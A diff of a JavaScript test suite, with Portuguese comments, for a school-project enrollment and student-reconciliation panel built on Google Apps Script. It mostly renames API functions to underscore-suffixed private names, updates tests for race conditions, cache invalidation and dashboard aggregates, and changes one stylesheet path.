+  const id = chamar(amb, 'listarAlunos_', { pagina: 1, tamanho: 50 }).itens
     .filter((a) => a.matricula === '9110001')[0].id;
-  igual(chamar(amb, 'resolverAluno', { id: id, status: 'DIVERGENCIA', observacoes: 'conferir na secretaria' }).ok, true);
+  igual(chamar(amb, 'resolverAluno_', { id: id, status: 'DIVERGENCIA', observacoes: 'conferir na secretaria' }).ok, true);
 
-  const r = chamar(amb, 'incluirInscricao', pedidoDeInclusao({ confirmar_outro_projeto: true }));
+  const r = chamar(amb, 'incluirInscricao_', pedidoDeInclusao({ confirmar_outro_projeto: true }));
   igual(r.ok, true, r.erro);
   igual(r.reconciliacao_pendente, false, r.reconciliacao_motivo);
 
-  const ficha = amb.api.ler('alunos', id);
+  const ficha = amb.api.ler_('alunos', id);
   igual(ficha.status, 'DIVERGENCIA', 'o incremental passou por cima da decisão humana');
   igual(ficha.observacoes, 'conferir na secretaria');
-  // 'anonimo' é o que `usuarioAtual()` responde no painel publicado (o cenário
+  // 'anonimo' é o que `usuarioAtual_()` responde no painel publicado (o cenário
   // é o do GitHub Pages, ver `cenarioInclusao`). O que importa é o campo
   // continuar preenchido: é ele o sinal de que houve gente.
   igual(ficha.revisado_por, 'anonimo');
@@ -3460,16 +3503,16 @@ teste('a decisão da coordenação sobrevive à inclusão da MESMA pessoa em out
   // `porChegada_` desempata pelo id do documento. Quem prova que ela é a mesma
   // não é a frase acima — é a rodada de auditoria logo abaixo, que não reescreve.
   igual(ficha.projeto, 'R+ Cidades | Robótica');
-  igual(chamar(amb, 'atualizarAlunos', { pagina: 1, tamanho: 50 }).reconciliacao.resumo.escritos, 0,
+  igual(chamar(amb, 'atualizarAlunos_', { pagina: 1, tamanho: 50 }).reconciliacao.resumo.escritos, 0,
     'a rodada discordou do incremental — inclusive da decisão preservada');
 });
 
 teste('a inclusão derruba o cache dos números do Painel', () => {
   const amb = cenarioInclusao();
-  chamar(amb, 'painelEstatisticas');
-  chamar(amb, 'incluirInscricao', pedidoDeInclusao());
+  chamar(amb, 'painelEstatisticas_');
+  chamar(amb, 'incluirInscricao_', pedidoDeInclusao());
   amb.zerar();
-  const r = chamar(amb, 'painelEstatisticas');
+  const r = chamar(amb, 'painelEstatisticas_');
   igual(r.dados.inscricoes, 1, 'o Painel continuou respondendo do cache com a contagem de antes');
   verdadeiro(amb.falso.requisicoes.length > 0);
 });
@@ -3491,11 +3534,11 @@ teste('com `aluno_projeto_unico=SIM`, incluir quem já está em outro projeto PE
   // (a janela, o `cadastro_aberto`, o anti-abuso, o teto) é passável por
   // decisão da coordenação, e recusar a deixaria sem saída depois do prazo.
   const amb = cenarioInclusao();
-  amb.api.gravarConfig('aluno_projeto_unico', 'SIM');
+  amb.api.gravarConfig_('aluno_projeto_unico', 'SIM');
   inscrever(amb.api, 'p2', 'Robótica', { matricula: '9110001', nome: 'Aluna Exemplo', email: 'aluna@exemplo.com' });
   amb.zerar();
 
-  const pergunta = chamar(amb, 'incluirInscricao', pedidoDeInclusao());
+  const pergunta = chamar(amb, 'incluirInscricao_', pedidoDeInclusao());
 
   // O custo da pergunta é medido ANTES de qualquer conferência que vá ao banco
   // (listar as inscrições, ler o log): as duas contam requisições.
@@ -3524,7 +3567,7 @@ teste('com `aluno_projeto_unico=SIM`, incluir quem já está em outro projeto PE
 
   // O segundo envio traz o campo marcado: a coordenação decide, e inclui.
   amb.zerar();
-  const r = chamar(amb, 'incluirInscricao', pedidoDeInclusao({ confirmar_outro_projeto: true }));
+  const r = chamar(amb, 'incluirInscricao_', pedidoDeInclusao({ confirmar_outro_projeto: true }));
   igual(r.ok, true, r.erro);
   igual(inscricoesGravadas(amb).length, 2);
   verdadeiro(r.aviso.indexOf('Robótica') !== -1, 'o aviso de sempre continua nomeando o outro projeto: ' + r.aviso);
@@ -3538,7 +3581,7 @@ teste('com a chave em NAO nada muda: inclui e avisa, sem pergunta nenhuma', () =
   const amb = cenarioInclusao();
   inscrever(amb.api, 'p2', 'Robótica', { matricula: '9110001', nome: 'Aluna Exemplo', email: 'aluna@exemplo.com' });
 
-  const r = chamar(amb, 'incluirInscricao', pedidoDeInclusao());
+  const r = chamar(amb, 'incluirInscricao_', pedidoDeInclusao());
   igual(r.ok, true, r.erro);
   igual(r.precisa_confirmar, undefined);
   igual(inscricoesGravadas(amb).length, 2);
@@ -3553,11 +3596,11 @@ teste('com SIM, a PROMOÇÃO da fila entra na mesma pergunta — e a frase não 
   // inscrição, e mover ESTA para onde ela já está bate no 409 de
   // `gravarInscricaoEditada_`.
   const amb = cenarioDaFila(null, true);
-  amb.api.gravarConfig('aluno_projeto_unico', 'SIM');
+  amb.api.gravarConfig_('aluno_projeto_unico', 'SIM');
   inscrever(amb.api, 'p1', 'R+ Cidades', { matricula: '9110001', nome: 'Aluna Exemplo', email: 'aluna@exemplo.com' });
   amb.zerar();
 
-  const pergunta = chamar(amb, 'incluirInscricao', pedidoDeInclusao({ projeto_id: 'p2', confirmar_teto: true }));
+  const pergunta = chamar(amb, 'incluirInscricao_', pedidoDeInclusao({ projeto_id: 'p2', confirmar_teto: true }));
   igual(pergunta.ok, false);
   igual(pergunta.precisa_confirmar, true);
   igual(pergunta.confirmar_campo, 'confirmar_outro_projeto');
@@ -3565,16 +3608,16 @@ teste('com SIM, a PROMOÇÃO da fila entra na mesma pergunta — e a frase não 
   igual(pergunta.erro.indexOf('Editar'), -1,
     'a pergunta da promoção não pode mandar mover o que ela não move: ' + pergunta.erro);
   igual(gravacoes(amb.falso).length, 0, 'perguntou depois de já ter mexido no banco');
-  igual(amb.api.ler('inscricoes', amb.fila.id).em_espera, 'SIM', 'promoveu sem confirmação');
+  igual(amb.api.ler_('inscricoes', amb.fila.id).em_espera, 'SIM', 'promoveu sem confirmação');
 
   // Confirmada, a promoção é a de sempre: o protocolo EXISTENTE, sem documento novo.
-  const r = chamar(amb, 'incluirInscricao', pedidoDeInclusao({
+  const r = chamar(amb, 'incluirInscricao_', pedidoDeInclusao({
     projeto_id: 'p2', confirmar_teto: true, confirmar_outro_projeto: true
   }));
   igual(r.ok, true, r.erro);
   igual(r.promovida_da_fila, true);
   igual(r.id, amb.fila.id);
-  igual(amb.api.ler('inscricoes', amb.fila.id).em_espera, undefined);
+  igual(amb.api.ler_('inscricoes', amb.fila.id).em_espera, undefined);
   igual(amb.api.contarInscritos_('p2'), 3);
 });
 
@@ -3582,22 +3625,22 @@ teste('o aluno troca de projeto entre a leitura e a promoção: ninguém é prom
   // O gêmeo, nesta porta, do teste da promoção do Auditório. A janela aqui é
   // MAIOR: não há lock, e entre a leitura da inscrição recusada e a escrita
   // passam os segundos do Apps Script. Mutação que derruba: voltar ao
-  // `escreverEmLote` (upsert sem precondição nenhuma) — a inscrição que a troca
+  // `escreverEmLote_` (upsert sem precondição nenhuma) — a inscrição que a troca
   // apagou volta à vida, agora SEM as marcas de fila, isto é, OCUPANDO VAGA: o
   // aluno fica em dois projetos, a cópia na quarentena fica órfã e o teto de p2
   // sobe um.
   const amb = cenarioDaFila(null, true);
-  const lerReal = amb.api.ler;
-  amb.api.ler = function (colecao, id) {
+  const lerReal = amb.api.ler_;
+  amb.api.ler_ = function (colecao, id) {
     const doc = lerReal(colecao, id);
     if (colecao === 'inscricoes' && doc && String(doc.em_espera).toUpperCase() === 'SIM') {
       // A troca do aluno, com o Incluir em voo: a antiga vai para a quarentena
       // e some de `inscricoes`, e a nova nasce noutro projeto.
-      amb.api.escreverEmLote('inscricoes_anuladas', [Object.assign({}, doc, {
+      amb.api.escreverEmLote_('inscricoes_anuladas', [Object.assign({}, doc, {
         anulado_em: '2026-09-22 18:00:00', anulado_por: 'aluno',
         anulado_motivo: 'TROCA', trocado_para: 'i_nova'
       })]);
-      amb.api.excluir('inscricoes', id);
+      amb.api.excluir_('inscricoes', id);
       inscrever(amb.api, 'p1', 'R+ Cidades', {
         matricula: '9110001', nome: 'Aluna Exemplo', email: 'aluna@exemplo.com'
       });
@@ -3605,13 +3648,13 @@ teste('o aluno troca de projeto entre a leitura e a promoção: ninguém é prom
     return doc;
   };
 
-  const r = chamar(amb, 'incluirInscricao', pedidoDeInclusao({ projeto_id: 'p2', confirmar_teto: true }));
-  amb.api.ler = lerReal;
+  const r = chamar(amb, 'incluirInscricao_', pedidoDeInclusao({ projeto_id: 'p2', confirmar_teto: true }));
+  amb.api.ler_ = lerReal;
 
   igual(r.ok, false);
   verdadeiro(r.erro.indexOf('ficha é de antes') !== -1, 'a mensagem foi: ' + r.erro);
   verdadeiro(r.erro.indexOf('ninguém foi promovido') !== -1, 'a mensagem foi: ' + r.erro);
-  igual(amb.api.ler('inscricoes', amb.fila.id), null, 'a inscrição trocada voltou à vida ocupando vaga');
+  igual(amb.api.ler_('inscricoes', amb.fila.id), null, 'a inscrição trocada voltou à vida ocupando vaga');
   igual(amb.api.contarInscritos_('p2'), 2, 'o teto do projeto subiu por uma promoção que não aconteceu');
   igual(amb.api.contarInscritos_('p1'), 1);
   igual(linhasDoLog(amb, 'INSCRICAO_INCLUIDA').length, 0,
@@ -3627,12 +3670,12 @@ teste('a resposta do banco perdida DEPOIS do commit: o Incluir não diz que ning
   // Mutação que derruba: ignorar `escritaIndeterminada_` e responder a frase da
   // corrida — a coordenação lê "ninguém foi promovido" sobre uma pessoa que
   // acabou de ganhar vaga, e clica de novo. A outra, gêmea da de
-  // testes/auditorio.js: sair daqui sem `registrar` — o `registrar` de sucesso
+  // testes/auditorio.js: sair daqui sem `registrar_` — o `registrar_` de sucesso
   // fica depois deste ramo, e a promoção entraria sem UMA linha no Histórico.
   const amb = cenarioDaFila(null, true);
   amb.falso.derrubarDepoisDeAplicar(':commit', 503, 'UNAVAILABLE');
 
-  const r = chamar(amb, 'incluirInscricao', pedidoDeInclusao({ projeto_id: 'p2', confirmar_teto: true }));
+  const r = chamar(amb, 'incluirInscricao_', pedidoDeInclusao({ projeto_id: 'p2', confirmar_teto: true }));
 
   igual(r.ok, false, 'o que não se pode confirmar não volta como sucesso');
   igual(r.erro.indexOf('ninguém foi promovido'), -1, 'a mensagem foi: ' + r.erro);
@@ -3640,7 +3683,7 @@ teste('a resposta do banco perdida DEPOIS do commit: o Incluir não diz que ning
   verdadeiro(r.erro.indexOf('Recarregue') !== -1, 'a mensagem foi: ' + r.erro);
 
   // E a promoção entrou — é o estado que a frase antiga negava.
-  igual(amb.api.ler('inscricoes', amb.fila.id).em_espera, undefined, 'a promoção não foi aplicada');
+  igual(amb.api.ler_('inscricoes', amb.fila.id).em_espera, undefined, 'a promoção não foi aplicada');
 
   // A trilha sai MESMO ASSIM: é o único rastro de uma promoção que pode ter
   // entrado, porque a resposta diz que não sabe e a ficha não guarda a tentativa.
@@ -3649,7 +3692,7 @@ teste('a resposta do banco perdida DEPOIS do commit: o Incluir não diz que ning
   const detalhe = linhasDoLog(amb, 'INSCRICAO_INCLUIDA')[0].detalhe;
   verdadeiro(detalhe.indexOf('INDETERMINADO') !== -1, 'o detalhe foi: ' + detalhe);
   // Quem tentou está na COLUNA, e não na frase: um ramo que sai por aqui sem
-  // passar por `registrar` não teria nem a tentativa, e um que registre sem
+  // passar por `registrar_` não teria nem a tentativa, e um que registre sem
   // operador não diria de quem foi a tentativa.
   igual(linhasDoLog(amb, 'INSCRICAO_INCLUIDA')[0].usuario, 'coordenacao@exemplo.com',
     'a linha do ramo indeterminado não diz quem tentou');
@@ -3672,7 +3715,7 @@ teste('a recusa do Incluir chega à tela SEM o caminho do documento (D-27)', () 
     fetchAll: (lote) => real.fetchAll(lote)
   };
 
-  const r = chamar(amb, 'incluirInscricao', pedidoDeInclusao());
+  const r = chamar(amb, 'incluirInscricao_', pedidoDeInclusao());
   amb.api.UrlFetchApp = real;
 
   igual(r.ok, false);
@@ -3690,12 +3733,12 @@ teste('encontrada: nome, e-mail, telefone formatado, curso, turma e os projetos 
   // projeto)" por igualdade de nome (projeto renomeado ou homônimo enganava) e
   // não tinha como dizer que a pessoa está na FILA, e não na vaga.
   const amb = cenarioInclusao();
-  amb.api.atualizar('matriculados', '9110001', { email: 'aluna@exemplo.com', telefone: '48999990000' });
+  amb.api.atualizar_('matriculados', '9110001', { email: 'aluna@exemplo.com', telefone: '48999990000' });
   const naVaga = inscrever(amb.api, 'p1', 'R+ Cidades', { matricula: '9110001', nome: 'Aluna Exemplo', email: 'aluna@exemplo.com' });
   const naFila = inscrever(amb.api, 'p2', 'Robótica', { matricula: '9110001', nome: 'Aluna Exemplo', email: 'aluna@exemplo.com', em_espera: 'SIM' });
   amb.zerar();
 
-  const r = chamar(amb, 'buscarMatriculado', { matricula: '09110001' });   // com o zero da secretaria
+  const r = chamar(amb, 'buscarMatriculado_', { matricula: '09110001' });   // com o zero da secretaria
   igual(r.ok, true, r.erro);
   igual(r.encontrado, true);
   igual(r.nome, 'Aluna Exemplo');
@@ -3724,7 +3767,7 @@ teste('não encontrada: encontrado=false, campos vazios — e ja_em continua res
   inscrever(amb.api, 'p2', 'Robótica', { matricula: '9110999', nome: 'Fora Da Lista', email: 'fora@exemplo.com' });
   amb.zerar();
 
-  const r = chamar(amb, 'buscarMatriculado', { matricula: '9110999' });
+  const r = chamar(amb, 'buscarMatriculado_', { matricula: '9110999' });
   igual(r.ok, true, r.erro);
   igual(r.encontrado, false);
   igual([r.nome, r.email, r.telefone, r.curso, r.turma], ['', '', '', '', '']);
@@ -3736,11 +3779,11 @@ teste('formato inválido ou vazia: recusa sem ler nada', () => {
   const amb = cenarioInclusao();
   amb.zerar();
 
-  const curta = chamar(amb, 'buscarMatriculado', { matricula: '911' });
+  const curta = chamar(amb, 'buscarMatriculado_', { matricula: '911' });
   igual(curta.ok, false);
   verdadeiro(/7 d.gitos/.test(curta.erro), curta.erro);
 
-  const vazia = chamar(amb, 'buscarMatriculado', { matricula: '' });
+  const vazia = chamar(amb, 'buscarMatriculado_', { matricula: '' });
   igual(vazia.ok, false);
   igual(vazia.erro, 'Informe a matrícula.');
 
@@ -3761,9 +3804,9 @@ function cenarioAtualizar() {
 
 teste('o primeiro Atualizar cruza os dados e devolve a lista na mesma chamada', () => {
   const amb = cenarioAtualizar();
-  igual(amb.api.contar('alunos'), 0, 'a inscrição ainda não virou ficha — é o retrato que o botão conserta');
+  igual(amb.api.contar_('alunos'), 0, 'a inscrição ainda não virou ficha — é o retrato que o botão conserta');
 
-  const r = chamar(amb, 'atualizarAlunos', { pagina: 1, tamanho: 50 });
+  const r = chamar(amb, 'atualizarAlunos_', { pagina: 1, tamanho: 50 });
   igual(r.ok, true, r.erro);
   igual(r.reconciliacao.rodou, true);
   igual(r.reconciliacao.resumo.confirmado, 1);
@@ -3773,10 +3816,10 @@ teste('o primeiro Atualizar cruza os dados e devolve a lista na mesma chamada', 
 
 teste('o segundo Atualizar não cruza de novo: nada entrou', () => {
   const amb = cenarioAtualizar();
-  chamar(amb, 'atualizarAlunos', { pagina: 1, tamanho: 50 });
+  chamar(amb, 'atualizarAlunos_', { pagina: 1, tamanho: 50 });
   amb.zerar();
 
-  const r = chamar(amb, 'atualizarAlunos', { pagina: 1, tamanho: 50 });
+  const r = chamar(amb, 'atualizarAlunos_', { pagina: 1, tamanho: 50 });
   igual(r.reconciliacao.rodou, false);
   verdadeiro(/nada entrou desde a última vez/.test(r.reconciliacao.motivo), r.reconciliacao.motivo);
   igual(r.ok, true, 'a lista tem de vir mesmo assim — recusar o cruzamento não é recusar o botão');
@@ -3785,10 +3828,10 @@ teste('o segundo Atualizar não cruza de novo: nada entrou', () => {
 
 teste('dez cliques seguidos custam dez pares de agregações, e não dez cruzamentos', () => {
   const amb = cenarioAtualizar();
-  chamar(amb, 'atualizarAlunos', { pagina: 1, tamanho: 50 });
+  chamar(amb, 'atualizarAlunos_', { pagina: 1, tamanho: 50 });
   amb.zerar();
 
-  for (let i = 0; i < 10; i++) chamar(amb, 'atualizarAlunos', { pagina: 1, tamanho: 50 });
+  for (let i = 0; i < 10; i++) chamar(amb, 'atualizarAlunos_', { pagina: 1, tamanho: 50 });
 
   // Sem o freio, cada clique releria `inscricoes`, `matriculados` e `alunos`
   // inteiras. Com ele, o clique é do tamanho de uma listagem: as duas
@@ -3801,32 +3844,32 @@ teste('dez cliques seguidos custam dez pares de agregações, e não dez cruzame
 
 teste('inscrição nova reabre o cruzamento no clique seguinte', () => {
   const amb = cenarioAtualizar();
-  chamar(amb, 'atualizarAlunos', { pagina: 1, tamanho: 50 });
+  chamar(amb, 'atualizarAlunos_', { pagina: 1, tamanho: 50 });
 
   inscrever(amb.api, 'p1', 'R+ Cidades', {
     matricula: '9110702', nome: 'Caio Reis', email: 'caio@exemplo.com', curso_fase: 'ADS - ADS21'
   });
 
-  const r = chamar(amb, 'atualizarAlunos', { pagina: 1, tamanho: 50 });
+  const r = chamar(amb, 'atualizarAlunos_', { pagina: 1, tamanho: 50 });
   igual(r.reconciliacao.rodou, true, 'o freio segurou uma inscrição que ACABOU de chegar');
   igual(r.itens.length, 2);
 });
 
 teste('importar a lista oficial também reabre o cruzamento', () => {
   const amb = cenarioAtualizar();
-  chamar(amb, 'atualizarAlunos', { pagina: 1, tamanho: 50 });
+  chamar(amb, 'atualizarAlunos_', { pagina: 1, tamanho: 50 });
 
   // O freio olha os DOIS lados. Se olhasse só as inscrições, uma importação de
   // 2.500 matriculados não faria diferença nenhuma no botão.
   semearMatriculado(amb.api, '9110703', 'Duda Rocha', 'ADM', 'ADM61');
 
-  igual(chamar(amb, 'atualizarAlunos', { pagina: 1, tamanho: 50 }).reconciliacao.rodou, true);
+  igual(chamar(amb, 'atualizarAlunos_', { pagina: 1, tamanho: 50 }).reconciliacao.rodou, true);
 });
 
 teste('a TROCA de projeto do aluno declara o cadastro sujo — a contagem não muda, e a ficha muda', () => {
   // O defeito que este teste nasceu vermelho para provar (22/09): a troca apaga
   // a inscrição antiga e cria a nova no MESMO `:commit` (04_Inscricoes.gs), então
-  // `contar('inscricoes')` fica IGUAL. O freio 1 compara contagens, não vê nada,
+  // `contar_('inscricoes')` fica IGUAL. O freio 1 compara contagens, não vê nada,
   // e o Atualizar responde "nada entrou desde a última vez" com a ficha
   // mostrando o projeto ANTIGO e um `inscricao_id` que aponta para um documento
   // apagado. É o mesmo buraco que `esquecerMarcaDaReconciliacao_` foi criada
@@ -3834,23 +3877,23 @@ teste('a TROCA de projeto do aluno declara o cadastro sujo — a contagem não m
   // receber a linha.
   //
   // Mutação que derruba: tirar o `esquecerMarcaDaReconciliacao_()` de
-  // `submeterInscricao` — `marca.inscricoes` volta a ser 1 e o Atualizar seguinte
+  // `submeterInscricao_` — `marca.inscricoes` volta a ser 1 e o Atualizar seguinte
   // recusa cruzar.
   const amb = cenarioAtualizar();
   semearProjeto(amb.api, 'p2', 'Horta Comunitária', 30);
-  amb.api.gravarConfig('aluno_projeto_unico', 'SIM');
+  amb.api.gravarConfig_('aluno_projeto_unico', 'SIM');
   // O falso de `apoio.js` não tem LockService, e a troca grava dentro dele.
   amb.api.LockService = { getScriptLock: () => ({ waitLock() {}, releaseLock() {} }) };
 
-  // A ficha é lida do banco, e não de `listarAlunos`: a linha da tela não leva
+  // A ficha é lida do banco, e não de `listarAlunos_`: a linha da tela não leva
   // `projeto` (ver `formatarAlunoParaTela_`), e é justamente o campo que fica velho.
-  const ficha = () => amb.api.listar('alunos', {}).itens[0];
+  const ficha = () => amb.api.listar_('alunos', {}).itens[0];
 
-  chamar(amb, 'atualizarAlunos', { pagina: 1, tamanho: 50 });
+  chamar(amb, 'atualizarAlunos_', { pagina: 1, tamanho: 50 });
   igual(ficha().projeto, 'R+ Cidades');
-  const antes = amb.api.contar('inscricoes');
+  const antes = amb.api.contar_('inscricoes');
 
-  const troca = amb.api.submeterInscricao({
+  const troca = amb.api.submeterInscricao_({
     projeto_id: 'p2', matricula: '9110701', nome: 'Ana Lima', email: 'ana@exemplo.com',
     whatsapp: '48999998888', curso_fase: 'ADS - ADS21',
     declara_ciencia: true, autoriza_imagem: true, consentimento_lgpd: true,
@@ -3858,11 +3901,11 @@ teste('a TROCA de projeto do aluno declara o cadastro sujo — a contagem não m
   });
   igual(troca.ok, true, troca.erro);
   verdadeiro(troca.trocada, 'o cenário não chegou a trocar de projeto');
-  igual(amb.api.contar('inscricoes'), antes, 'a troca apaga uma e cria outra: é por isso que o freio 1 não a vê');
+  igual(amb.api.contar_('inscricoes'), antes, 'a troca apaga uma e cria outra: é por isso que o freio 1 não a vê');
 
   igual(amb.api.marcaDaReconciliacao_().inscricoes, -1, 'a troca não declarou o cadastro sujo');
 
-  const depois = chamar(amb, 'atualizarAlunos', { pagina: 1, tamanho: 50 });
+  const depois = chamar(amb, 'atualizarAlunos_', { pagina: 1, tamanho: 50 });
   igual(depois.reconciliacao.rodou, true,
     'o Atualizar afirmou "nada entrou" sobre uma ficha com o projeto antigo');
   igual(ficha().projeto, 'Horta Comunitária');
@@ -3870,7 +3913,7 @@ teste('a TROCA de projeto do aluno declara o cadastro sujo — a contagem não m
 
 teste('o orçamento do dia trava o cruzamento, e a recusa traz o número', () => {
   const amb = cenarioAtualizar();
-  chamar(amb, 'atualizarAlunos', { pagina: 1, tamanho: 50 });
+  chamar(amb, 'atualizarAlunos_', { pagina: 1, tamanho: 50 });
 
   // Empurra a marca para um dia que já gastou tudo. É o cenário do evento: cada
   // clique tem gente nova para cruzar, então o freio 1 nunca fecha.
@@ -3879,7 +3922,7 @@ teste('o orçamento do dia trava o cruzamento, e a recusa traz o número', () =>
   marca.inscricoes = -1;
   amb.propriedades.set('painel_reconciliacao', JSON.stringify(marca));
 
-  const r = chamar(amb, 'atualizarAlunos', { pagina: 1, tamanho: 50 });
+  const r = chamar(amb, 'atualizarAlunos_', { pagina: 1, tamanho: 50 });
   igual(r.reconciliacao.rodou, false);
   verdadeiro(r.reconciliacao.motivo.indexOf(String(amb.api.PAINEL_ORCAMENTO_RECONCILIACAO)) !== -1,
     'a recusa precisa dizer o teto: ' + r.reconciliacao.motivo);
@@ -3890,7 +3933,7 @@ teste('o orçamento do dia trava o cruzamento, e a recusa traz o número', () =>
 
 teste('o orçamento é por DIA: virou o dia, o botão volta a cruzar', () => {
   const amb = cenarioAtualizar();
-  chamar(amb, 'atualizarAlunos', { pagina: 1, tamanho: 50 });
+  chamar(amb, 'atualizarAlunos_', { pagina: 1, tamanho: 50 });
 
   const marca = JSON.parse(amb.propriedades.get('painel_reconciliacao'));
   marca.gasto = amb.api.PAINEL_ORCAMENTO_RECONCILIACAO;
@@ -3898,15 +3941,15 @@ teste('o orçamento é por DIA: virou o dia, o botão volta a cruzar', () => {
   marca.dia = '2020-01-01';
   amb.propriedades.set('painel_reconciliacao', JSON.stringify(marca));
 
-  igual(chamar(amb, 'atualizarAlunos', { pagina: 1, tamanho: 50 }).reconciliacao.rodou, true);
-  igual(JSON.parse(amb.propriedades.get('painel_reconciliacao')).dia, amb.api.agora().slice(0, 10));
+  igual(chamar(amb, 'atualizarAlunos_', { pagina: 1, tamanho: 50 }).reconciliacao.rodou, true);
+  igual(JSON.parse(amb.propriedades.get('painel_reconciliacao')).dia, amb.api.agora_().slice(0, 10));
 });
 
 teste('cruzamento que falha não derruba a lista junto', () => {
   const amb = cenarioAtualizar();
-  amb.api.reconciliar = () => { throw new Error('a coleção "matriculados" passou de 8000 documentos'); };
+  amb.api.reconciliar_ = () => { throw new Error('a coleção "matriculados" passou de 8000 documentos'); };
 
-  const r = chamar(amb, 'atualizarAlunos', { pagina: 1, tamanho: 50 });
+  const r = chamar(amb, 'atualizarAlunos_', { pagina: 1, tamanho: 50 });
   igual(r.ok, true, 'a lista é lida das mesmas coleções: ela continua correta, só mais velha');
   igual(r.reconciliacao.rodou, false);
   verdadeiro(/passou de 8000/.test(r.reconciliacao.motivo), r.reconciliacao.motivo);
@@ -3914,22 +3957,22 @@ teste('cruzamento que falha não derruba a lista junto', () => {
 
 teste('cruzar pelo botão derruba o cache dos números do Painel', () => {
   const amb = cenarioAtualizar();
-  chamar(amb, 'painelEstatisticas');            // esquenta o cache
-  chamar(amb, 'atualizarAlunos', { pagina: 1, tamanho: 50 });
+  chamar(amb, 'painelEstatisticas_');            // esquenta o cache
+  chamar(amb, 'atualizarAlunos_', { pagina: 1, tamanho: 50 });
   amb.zerar();
 
-  const d = chamar(amb, 'painelEstatisticas').dados;
+  const d = chamar(amb, 'painelEstatisticas_').dados;
   igual(d.total, 1, 'o Painel respondeu do cache um total de antes do cruzamento');
   verdadeiro(agregacoes(amb.falso).length > 0, 'o cache não foi invalidado');
 });
 
 teste('editar também não deixa o Painel mentir', () => {
   const amb = cenarioMatriculaTrocada();
-  chamar(amb, 'painelEstatisticas');
-  chamar(amb, 'editarAluno', { id: amb.idDoBruno, turma: 'ADM62' });
+  chamar(amb, 'painelEstatisticas_');
+  chamar(amb, 'editarAluno_', { id: amb.idDoBruno, turma: 'ADM62' });
   amb.zerar();
 
-  chamar(amb, 'painelEstatisticas');
+  chamar(amb, 'painelEstatisticas_');
   verdadeiro(agregacoes(amb.falso).length > 0, 'o cache sobreviveu a uma escrita que muda os números');
 });
 
@@ -3940,14 +3983,14 @@ grupo('Alunos por curso — teto e ordenação');
 function semearCursos(api, quantos) {
   const documento = { _id: 'cursos' };
   for (let i = 1; i <= quantos; i++) documento['CURSO ' + String(i).padStart(2, '0')] = String(i);
-  api.escreverEmLote('agregados', [documento]);
+  api.escreverEmLote_('agregados', [documento]);
 }
 
 teste('o cartão mostra os MAIORES primeiro, não a ordem alfabética', () => {
   const amb = ambiente();
   semearCursos(amb.api, 5);
 
-  const d = chamar(amb, 'painelEstatisticas').dados;
+  const d = chamar(amb, 'painelEstatisticas_').dados;
   igual(d.porCurso.map((c) => c.total), [5, 4, 3, 2, 1],
     'a linha grande é a razão de o cartão existir — ela não pode ficar no meio da lista');
 });
@@ -3956,7 +3999,7 @@ teste('o cartão tem teto, e o que fica de fora vai somado em vez de sumir', () 
   const amb = ambiente();
   semearCursos(amb.api, 20);
 
-  const d = chamar(amb, 'painelEstatisticas').dados;
+  const d = chamar(amb, 'painelEstatisticas_').dados;
   igual(d.porCurso.length, amb.api.PAINEL_TETO_CURSOS);
   igual(d.porCursoResto.cursos, 20 - amb.api.PAINEL_TETO_CURSOS);
 
@@ -3968,7 +4011,7 @@ teste('o filtro de curso continua alfabético e COMPLETO — teto nenhum ali', (
   const amb = ambiente();
   semearCursos(amb.api, 20);
 
-  const cursos = chamar(amb, 'listarAlunos', { pagina: 1, tamanho: 50 }).cursos;
+  const cursos = chamar(amb, 'listarAlunos_', { pagina: 1, tamanho: 50 }).cursos;
   igual(cursos.length, 20, 'um curso fora do select vira um filtro impossível de pedir');
   igual(cursos[0], 'CURSO 01');
   igual(cursos[19], 'CURSO 20');
@@ -3976,7 +4019,7 @@ teste('o filtro de curso continua alfabético e COMPLETO — teto nenhum ali', (
 
 teste('sem o documento de agregados, o cartão some em vez de quebrar', () => {
   const amb = ambiente();
-  const d = chamar(amb, 'painelEstatisticas').dados;
+  const d = chamar(amb, 'painelEstatisticas_').dados;
   igual(d.porCurso, []);
   igual(d.porCursoResto, { cursos: 0, alunos: 0 });
 });
@@ -4045,13 +4088,13 @@ teste('a lista de projetos só viaja quando a janela de edição pede', () => {
   const amb = cenarioMigracao();
   amb.zerar();
 
-  const semProjetos = chamar(amb, 'detalheAluno', { id: amb.idDaAna });
+  const semProjetos = chamar(amb, 'detalheAluno_', { id: amb.idDaAna });
   igual(semProjetos.projetos, undefined);
   igual(leiturasDePonto(amb.falso).length, 3, 'o detalhe continua custando três leituras de ponto');
   igual(consultas(amb.falso).length, 0);
 
   amb.zerar();
-  const comProjetos = chamar(amb, 'detalheAluno', { id: amb.idDaAna, projetos: true });
+  const comProjetos = chamar(amb, 'detalheAluno_', { id: amb.idDaAna, projetos: true });
   igual(comProjetos.projetos.length, 2);
   igual(consultas(amb.falso).length, 1, 'a lista de projetos é uma consulta só');
   igual(agregacoes(amb.falso).length, 2, 'a ocupação de cada projeto é uma agregação');
@@ -4109,7 +4152,9 @@ teste('a busca ignora acento e caixa', () => {
 
 teste('o e-mail do aluno quebra linha — era ele que criava a barra horizontal', () => {
   const html = ADMIN;
-  const css = fs.readFileSync(path.join(PASTA_GS, 'Estilos.html'), 'utf8');
+  // O CSS que o painel carrega (o gêmeo de apps-script/Estilos.html saiu com as
+  // páginas do Apps Script em 16/11/2026).
+  const css = fs.readFileSync(path.join(__dirname, '..', 'docs', 'painel', 'estilos.css'), 'utf8');
 
   verdadeiro(/'<td class="quebra">' \+ escapar\(a\.email\)/.test(html),
     'a coluna de e-mail voltou a nao quebrar');
